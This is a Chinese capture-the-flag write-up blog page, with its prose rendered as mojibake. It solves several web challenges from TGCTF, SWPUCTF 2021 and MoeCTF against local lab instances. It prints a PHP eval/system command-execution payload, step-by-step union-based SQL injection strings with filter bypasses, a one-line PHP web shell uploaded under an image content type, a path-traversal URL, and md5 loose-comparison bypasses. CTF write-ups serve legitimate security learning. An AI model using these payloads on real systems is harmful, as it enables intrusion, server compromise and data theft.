<p>ç»“åˆæ•´ä¸ª payload æ¥çœ‹ï¼Œç”±äºè„šæœ¬ä¸­æœªå¯¹ tgctf2025 å‚æ•°çš„æœ‰æ•ˆå­—ç¬¦è¿›è¡Œä¸¥æ ¼é™åˆ¶ï¼Œæ­£åˆ™è¡¨è¾¾å¼å­˜åœ¨æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ ç‰¹æ®Šçš„ PHP ä»£ç å¹¶é€šè¿‡ eval æ‰§è¡Œï¼Œä»è€Œå®ç°å‘½ä»¤æ‰§è¡Œç­‰æ¶æ„æ“ä½œï¼Œè¿™é‡Œçš„ payload åˆ©ç”¨äº† get_defined_vars() æ¥è·å–å˜é‡å¹¶ç»“åˆ b å‚æ•°ä¸­çš„ system å‡½æ•°è°ƒç”¨ï¼Œè¯•å›¾è¯»å–æœåŠ¡å™¨ä¸Šçš„æ•æ„Ÿæ–‡ä»¶å†…å®¹ï¼Œä½†å®é™…èƒ½å¦æˆåŠŸè¿˜å–å†³äºæœåŠ¡å™¨ç¯å¢ƒç­‰å…¶ä»–å› ç´ ï¼Œä¾‹å¦‚æ˜¯å¦å…è®¸ system å‡½æ•°æ‰§è¡Œç­‰ã€‚  </p>
<p>deepseek:<br>æ­¥éª¤ 1ï¼šè·å–æ‰€æœ‰å˜é‡<br>get_defined_vars() è¿”å›å½“å‰ä½œç”¨åŸŸå†…çš„æ‰€æœ‰å˜é‡ï¼ŒåŒ…æ‹¬è¶…å…¨å±€æ•°ç»„ $_GETã€‚æ­¤æ—¶ï¼Œ$_GET åŒ…å«ï¼š  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_GET</span> = [<br>    <span class="hljs-string">&#x27;tgctf2025&#x27;</span> =&gt; <span class="hljs-string">&#x27;eval(end(current(get_defined_vars())));&#x27;</span>,<br>    <span class="hljs-string">&#x27;b&#x27;</span> =&gt; <span class="hljs-string">&#x27;system(&quot;cat /f*&quot;);&#x27;</span><br>];<br></code></pre></td></tr></table></figure>
<p>æ­¥éª¤ 2ï¼šæå– $_GET æ•°ç»„<br>current(get_defined_vars())ï¼šcurrent() è¿”å›æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚ç”±äº $_GET æ˜¯è¶…å…¨å±€å˜é‡ï¼Œå®ƒåœ¨è¿”å›çš„æ•°ç»„ä¸­é€šå¸¸ä½äºå‰åˆ—ï¼Œå› æ­¤è¿™é‡Œè·å–åˆ° $_GET æ•°ç»„ã€‚  </p>
<p>end(current(â€¦))ï¼šå°† $_GET çš„å†…éƒ¨æŒ‡é’ˆç§»åŠ¨åˆ°æœ«å°¾ï¼ˆå³å‚æ•° bï¼‰ï¼Œå¹¶è¿”å›å…¶å€¼ system(â€˜cat &#x2F;f*â€™);ã€‚  </p>
<p>æ­¥éª¤ 3ï¼šæ‰§è¡Œå‘½ä»¤</p>
<p>eval(end(current(get_defined_vars()))) æœ€ç»ˆæ‰§è¡Œ system(â€˜cat &#x2F;f*â€™);ï¼Œè¯»å–æœåŠ¡å™¨ä¸Šçš„ &#x2F;f* æ–‡ä»¶ï¼ˆå¦‚ &#x2F;flagï¼‰ã€‚  </p>
<p>&#x2F;&#x2F; </p>
<p>æˆ‘çš„ç†è§£å°±æ˜¯ï¼š    </p>
<p>?tgctf2025&#x3D;eval(end(current(get_defined_vars())));&amp;b&#x3D;system(â€˜cat &#x2F;f*â€™);<br>å…ˆæ–°å»ºä¸€ä¸ªevalå‡½æ•°<br>ç„¶åget_defined_vars()ç”¨æ¥è¿”å›æ‰€æœ‰å®šä¹‰çš„å˜é‡ï¼ŒåŒ…å«å…¨å±€çš„éå…¨å±€çš„,è¿™ä¸¤ç±»ä¼šè¢«åˆ†ä¸ºä¸¤ä¸ªæ•°ç»„ï¼Œ<br>åœ¨ç”¨current()é€‰æ‹©get_defined_vars()ç”Ÿæˆçš„æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªï¼Œå› ä¸º$_GETä¸ºè¶…å…¨å±€å˜é‡ï¼Œæ‰€ä»¥ä¼šåœ¨è¿”å›çš„ç¬¬ä¸€ä¸ªï¼Œè€Œæ­¤æ—¶getä¸­æœ‰ä¸¤ä¸ªå˜é‡ï¼Œâ€™tgctf2025â€™ å’Œ â€˜bâ€™<br>å†ç”¨endæ¥é€‰å–å…¨å±€å˜é‡ç»„æˆçš„æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå³ä¸ºb</p>
<p>ç„¶åç”¨æœ€å¤–ç¬¬äºŒå±‚çš„evalå‡½æ•°æ¥æ‰§è¡Œå˜é‡$b,<br>è€Œæºç ä¸­çš„ç¬¬ä¸€å±‚eval å°±æ˜¯ç”¨æ¥æ‰§è¡Œè¿™ä¸¤æ®µæ“ä½œçš„ï¼Œç›¸å½“äºæˆ‘ä»¬ä¸Šä¼ äº†ä¸¤æ®µä»£ç   </p>
<h1 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-sql"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-sql" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]sql"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]sql</h1><p>æŒ‰f12 çœ‹åˆ°æ ‡é¢˜æç¤ºå‚æ•°æ˜¯wllm<br>ä¼ ä¸€ä¸ªwllm&#x3D;1çœ‹çœ‹ï¼Œè¿™ç†Ÿæ‚‰çš„ç»¿å­—ï¼Œæ„Ÿè§‰å›åˆ°äº†sql-labs<br>å†ä¼ ä¸ª2ï¼Œä¸å›æ˜¾<br>é‚£ç®€å•fuzzä¸€ä¸‹  </p>
<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs excel">è¿‡æ»¤äº†ï¼š<br>ç©ºæ ¼ <br>+<br>=<br><span class="hljs-built_in">and</span><br>updatexml<br>extr<br>extractvalue<br><br><span class="hljs-number">0</span>&#x27;<span class="hljs-built_in">or</span>%<span class="hljs-number">0</span>aunion%<span class="hljs-number">0</span>aselect%<span class="hljs-number">0</span>a1,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#<br><br><span class="hljs-number">1</span>&#x27;<span class="hljs-built_in">if</span>(<span class="hljs-number">1</span>=<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>
<p>å¥½å˜›ï¼Œè¯•äº†å¥½ä¹…åŸæ¥æ˜¯#å®ƒä¸è‡ªå·±è¿›è¡Œurlç¼–ç   </p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?wllm<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-variable">%27</span>order<span class="hljs-variable">%0</span>aby<span class="hljs-variable">%0</span>a<span class="hljs-number">3</span><span class="hljs-variable">%23</span><br>æµ‹å‡ºå›æ˜¾åˆ—ä¸º<span class="hljs-number">3</span>  <br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span><span class="hljs-number">3</span><span class="hljs-variable">%23</span><br><br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>database()<span class="hljs-punctuation">,</span><span class="hljs-number">3</span><span class="hljs-variable">%23</span><br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>group_concat(table_name)from(information_schema.tables)<span class="hljs-punctuation">,</span><span class="hljs-number">3</span><span class="hljs-variable">%23</span><br><br>/?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>group_concat(table_name)from(information_schema.tables)<span class="hljs-variable">%23</span><br>Your Password:ALL_PLUGINS<span class="hljs-punctuation">,</span>APPLICAB<br>//ä¸æ˜¯ï¼Œæˆ‘ç”¨ç¬¬äºŒè¡Œå›æ˜¾ç”šè‡³ä¼šæŠ¥é”™ï¼Ÿä»€ä¹ˆé¢˜ç›®ç¯å¢ƒ<br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>group_concat(table_name)from(information_schema.tables)where(table_schema)like(database())<span class="hljs-variable">%23</span><br>Your Password:LTLT_flag<span class="hljs-punctuation">,</span>users<br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>group_concat(column_name)from(information_schema.columns)where(table_name)like(&#x27;LTLT_flag&#x27;)<span class="hljs-variable">%23</span><br>Your Password:id<span class="hljs-punctuation">,</span>flag<br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>group_concat(flag)from(LTLT_flag)<span class="hljs-variable">%23</span><br>NSSCTF&#123;<span class="hljs-number">48</span>f<span class="hljs-number">21</span>b<span class="hljs-number">19</span>-<span class="hljs-keyword">c</span><span class="hljs-number">67</span>b<br>åªå¾—åˆ°ä¸€åŠ<br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>(group_concat(flag)from(LTLT_flag))<span class="hljs-variable">%23</span><br>è¯•äº†ä¸€ä¸‹  <br>reverseï¼Œ<br>left<br>éƒ½ä¸èƒ½ç”¨<br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>mid(group_concat(flag)<span class="hljs-punctuation">,</span><span class="hljs-number">20</span><span class="hljs-punctuation">,</span><span class="hljs-number">40</span>)from(LTLT_flag)<span class="hljs-variable">%23</span><br>midå‡½æ•°è¯•äº†å¥½ä¹…ï¼Œçœ‹wpæ‰çŸ¥é“æ­£ç¡®ç”¨æ³•ğŸ˜«<br>b<span class="hljs-number">-47</span>a<span class="hljs-number">5</span><span class="hljs-number">-8</span>cdf<span class="hljs-number">-17841</span>a<span class="hljs-number">4</span>e<br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>mid(group_concat(flag)<span class="hljs-punctuation">,</span><span class="hljs-number">40</span><span class="hljs-punctuation">,</span><span class="hljs-number">60</span>)from(LTLT_flag)<span class="hljs-variable">%23</span><br>ca<span class="hljs-number">1</span><span class="hljs-keyword">c</span>&#125;<br><br>NSSCTF&#123;<span class="hljs-number">48</span>f<span class="hljs-number">21</span>b<span class="hljs-number">19</span>-<span class="hljs-keyword">c</span><span class="hljs-number">67</span>b<span class="hljs-number">-47</span>a<span class="hljs-number">5</span><span class="hljs-number">-8</span>cdf<span class="hljs-number">-17841</span>a<span class="hljs-number">4</span>eca<span class="hljs-number">1</span><span class="hljs-keyword">c</span>&#125;<br></code></pre></td></tr></table></figure>
<p>æ€»ç»“ï¼Œä¸èƒ½å°çœ‹å•Šï¼Œå¤ªä¹…ä¸åšå®¹æ˜“åœ¨å°åœ°æ–¹çŠ¯é”™ï¼Œæ¯”å¦‚urlç¼–ç ï¼Œmidå‡½æ•°ä½¿ç”¨,å¹¸å¥½å¤§æ–¹å‘æ˜¯å¯¹çš„ï¼Œç»™ä¸€ä¸ªå®‰å¿ƒçœ‹åˆ«äººwpå¾—ç†ç”±å•Šå•ŠğŸ¤£</p>
<h1 id="MoeCTF-å«åˆ€ä¹‹è·¯01-MoeCTFï¼Ÿå¯åŠ¨ï¼"><a href="#MoeCTF-å«åˆ€ä¹‹è·¯01-MoeCTFï¼Ÿå¯åŠ¨ï¼" class="headerlink" title="MoeCTF å«åˆ€ä¹‹è·¯01: MoeCTFï¼Ÿå¯åŠ¨ï¼"></a>MoeCTF å«åˆ€ä¹‹è·¯01: MoeCTFï¼Ÿå¯åŠ¨ï¼</h1><p>ls &#x2F; æŸ¥çœ‹æ ¹ç›®å½•  </p>
<p>cat &#x2F;flag<br>æç¤ºflagä¸åœ¨è¿™ï¼Œå»çœ‹ç³»ç»Ÿç¯å¢ƒ  </p>
<p>env<br>æ‹¿åˆ°flag</p>
<h1 id="MoeCTF-å«åˆ€ä¹‹è·¯02-æ™®é€šçš„æ–‡ä»¶ä¸Šä¼ "><a href="#MoeCTF-å«åˆ€ä¹‹è·¯02-æ™®é€šçš„æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="MoeCTF å«åˆ€ä¹‹è·¯02: æ™®é€šçš„æ–‡ä»¶ä¸Šä¼ "></a>MoeCTF å«åˆ€ä¹‹è·¯02: æ™®é€šçš„æ–‡ä»¶ä¸Šä¼ </h1><p>ç›´æ¥ä¼ phpé©¬  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[shell]);<br></code></pre></td></tr></table></figure>

<p>ç„¶åç”¨èš‚èšè¿æˆ–è€…ç›´æ¥postä¸€ä¸ªenvå°±èƒ½çœ‹åˆ°flag</p>
<h1 id="MoeCTF-å«åˆ€ä¹‹è·¯03-è¿™æ˜¯ä¸€ä¸ªå›¾åºŠ"><a href="#MoeCTF-å«åˆ€ä¹‹è·¯03-è¿™æ˜¯ä¸€ä¸ªå›¾åºŠ" class="headerlink" title="MoeCTF å«åˆ€ä¹‹è·¯03: è¿™æ˜¯ä¸€ä¸ªå›¾åºŠ"></a>MoeCTF å«åˆ€ä¹‹è·¯03: è¿™æ˜¯ä¸€ä¸ªå›¾åºŠ</h1><p>åªåœ¨å‰ç«¯åšäº†é™åˆ¶ï¼Œæ”¹å‰ç«¯ä»£ç æˆ–è€…bpæŠ“åŒ…ä¼ å°±è¡Œ</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:13280<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>209<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryJHC9baVxiUBdxw4G<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1:13280<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1:13280/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-php">------WebKitFormBoundaryJHC9baVxiUBdxw4G</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;image&quot;</span>; filename=<span class="hljs-string">&quot;shell.php&quot;</span></span><br><span class="language-php">Content-Type: image/png</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[shell]);</span><br><span class="language-php">------WebKitFormBoundaryJHC9baVxiUBdxw4G--</span><br><span class="language-php"></span><br></code></pre></td></tr></table></figure>
<p>ä¼ å®Œåèš‚èšç›´æ¥è¿<br>åŒæ ·æŸ¥çœ‹ç¯å¢ƒæ‹¿åˆ°flag  </p>
<h1 id="MoeCTF-å«åˆ€ä¹‹è·¯04-ä¸€ä¸ªæ–‡ä»¶æµè§ˆå™¨"><a href="#MoeCTF-å«åˆ€ä¹‹è·¯04-ä¸€ä¸ªæ–‡ä»¶æµè§ˆå™¨" class="headerlink" title="MoeCTF å«åˆ€ä¹‹è·¯04: ä¸€ä¸ªæ–‡ä»¶æµè§ˆå™¨"></a>MoeCTF å«åˆ€ä¹‹è·¯04: ä¸€ä¸ªæ–‡ä»¶æµè§ˆå™¨</h1><p>javaç«™ç‚¹ï¼Œç›´æ¥åœ¨urlå°±èƒ½ç›®å½•ç©¿è¶Šï¼Œç„¶åå°±æ˜¯æ‰‹å·¥æ‰¾flagã€‚ã€‚ã€‚<br>flagç›®å½•ï¼š<br>?path&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;&#x2F;tmp&#x2F;flag  </p>
<h1 id="MoeCTF-ProveYourLove"><a href="#MoeCTF-ProveYourLove" class="headerlink" title="MoeCTF ProveYourLove"></a>MoeCTF ProveYourLove</h1><p>æ ¹æ®é¢˜ç›®æç¤ºä¼ å¤Ÿ 300æ¬¡å°±è¡Œ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>data = &#123;<span class="hljs-string">&quot;nickname&quot;</span>:<span class="hljs-string">&quot;mignon&quot;</span>,<span class="hljs-string">&quot;user_gender&quot;</span>:<span class="hljs-string">&quot;male&quot;</span>,<span class="hljs-string">&quot;target&quot;</span>:<span class="hljs-string">&quot;nm&quot;</span>,<span class="hljs-string">&quot;target_gender&quot;</span>:<span class="hljs-string">&quot;male&quot;</span>,<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;anonymous&quot;</span>:<span class="hljs-string">&quot;false&quot;</span>&#125;<br>url = <span class="hljs-string">&#x27;http://127.0.0.1:42701/questionnaire&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">300</span>):<br>    qq = requests.post(url,json=data)<br>    <span class="hljs-built_in">print</span>(qq.text)<br></code></pre></td></tr></table></figure>

<h1 id="Moe-CTF-é™æ€ç½‘é¡µ"><a href="#Moe-CTF-é™æ€ç½‘é¡µ" class="headerlink" title="Moe CTF é™æ€ç½‘é¡µ"></a>Moe CTF é™æ€ç½‘é¡µ</h1><p>ç‚¹å‡»çœ‹æ¿å¨˜ï¼Œä¼šåœ¨bpçœ‹åˆ°å‘åŒ…å¹¶ä¸”æœ‰ä¸ªä¼ å‚ï¼Œåœ¨æµè§ˆå™¨è®¿é—®å¹¶ä¸”æ”¹id&#x3D;1<br>åœ¨æœ€ä¸‹é¢çœ‹åˆ°final1l1l_challenge.php<br>ç›´æ¥è®¿é—®<br>å¾—åˆ°  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;final1l1l_challenge.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$a</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$b</span>)) &#123; <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-variable">$b</span>[<span class="hljs-variable">$a</span>]) &#123; <br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;noooooooooooo&#x27;</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;Notice the param type!&#x27;</span>);<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;Where is your param?&#x27;</span>);<br>&#125; Where is your param?<br></code></pre></td></tr></table></figure>
<p>è¦æ±‚ aå’Œbéƒ½ä¸æ˜¯æ•°å­—<br>aç­‰äº0ï¼Œå¹¶ä¸”açš„md5å€¼ç­‰äºbçš„æ•°ç»„çš„a?<br>æœ‰ç‚¹ä¹±  </p>
<p>è¿™ä¸ªç»•ä¸è¿‡ï¼Œçœ‹åˆ°ç½‘ä¸Šæœ‰ä¸¤ç§è§£æ³•  </p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">1</span>:<br>æ„æ€æ˜¯è®©æˆ‘ä»¬<span class="hljs-built_in">get</span>è¾“å…¥<span class="hljs-keyword">a</span>ï¼Œ<span class="hljs-built_in">post</span>è¾“å…¥bï¼Œä¸”ä¸¤ä¸ªå˜é‡éƒ½ä¸æ˜¯æ•°å­—ï¼Œç„¶å<span class="hljs-keyword">a</span>å¼±ç›¸ç­‰ç­‰äº<span class="hljs-number">0</span>ï¼Œmd5($<span class="hljs-keyword">a</span>)å’Œbçš„ç¬¬$<span class="hljs-keyword">a</span>ä¸ªå…ƒç´ å¼±ç›¸ç­‰ï¼Œé‚£å…¶å®åªè¦<span class="hljs-keyword">a</span>ç¬¬ä¸€ä½æ•°å­—æ˜¯å­—æ¯ï¼Œmd5($<span class="hljs-keyword">a</span>)ä¸ºç»å…¸<span class="hljs-number">0</span>eå¼€å¤´æ•°å­—ï¼Œbéšä¾¿å–ä¸ª<span class="hljs-number">0</span>kå°±è¡Œï¼Œæ„é€ ?<span class="hljs-keyword">a</span>=QNKCDZO,<span class="hljs-built_in">post</span>è¾“å…¥b=<span class="hljs-number">0</span>kå°±å¯ä»¥äº†ã€‚å¾—åˆ°flagã€‚<br><br>å‡ºé¢˜äººè‡ªå·±çš„è§£æ³•ï¼š<br>ååŠéƒ¨åˆ†è¦æ±‚æ˜¯ md5($<span class="hljs-keyword">a</span>) == $b[$<span class="hljs-keyword">a</span>]ï¼Œæœ‰çš„å¸ˆå‚…å¯èƒ½è®¤ä¸ºè¿™æ˜¯ md5 ç»•è¿‡ï¼Œå¹¶ä¸”è¯´ç»•ä¸è¿‡å»ã€‚å…¶å®åªè¦é™ä¸‹æ¥å®šç›ä¸€çœ‹å°±èƒ½çœ‹å‡ºæ¥ï¼Œè¿™ä¸ªè¡¨è¾¾å¼å…¶å®å¹¶æ²¡æœ‰å¯¹ <span class="hljs-keyword">a</span> å‚æ•°åšå‡ºä»»ä½•é™åˆ¶ï¼Œå…¨æ˜¯å¯¹ b çš„é™åˆ¶ã€‚æ‰€ä»¥ç»†çœ‹å°±èƒ½çŸ¥é“ï¼Œæˆ‘ä»¬è¦æ±‚çš„æ˜¯ b[<span class="hljs-keyword">a</span>] å°±æ˜¯ <span class="hljs-keyword">a</span> çš„ md5 å€¼ã€‚è‡³äºå¦‚ä½•èµ‹å€¼ï¼Œè¯·çœ‹ä¸‹æ–‡ï¼š<br><br>GET: ?<span class="hljs-keyword">a</span>=<span class="hljs-number">0</span><span class="hljs-keyword">a</span><br>POST:<br>b[<span class="hljs-number">0</span><span class="hljs-keyword">a</span>]=e99bb33727d338314912e86fbdec87af<br><br>å¯ä»¥çœ‹åˆ°ï¼Œæƒ³è¦ä¼ æ•°ç»„ï¼Œç›´æ¥æŠŠ <span class="hljs-keyword">a</span> çš„å€¼ä¸¢è¿›ä¸­æ‹¬å·å°±è¡Œäº†ã€‚b çš„å€¼å°±æ˜¯ <span class="hljs-number">0</span><span class="hljs-keyword">a</span> çš„ md5 å€¼ã€‚<br></code></pre></td></tr></table></figure>
<p>æŒ‰ç…§å‡ºé¢˜çš„è¯´æ³•è¯•äº†ä¸€ä¸‹<br>a&#x3D;0b<br>b[0b]&#x3D;347017fd1e37a22faf91875981bc4fb3<br>ç¡®å®å¯ä»¥äº†<br>åŸæ¥è¿˜å¯ä»¥è¿™æ ·ä¼ æ•°ç»„å•Š  </p>
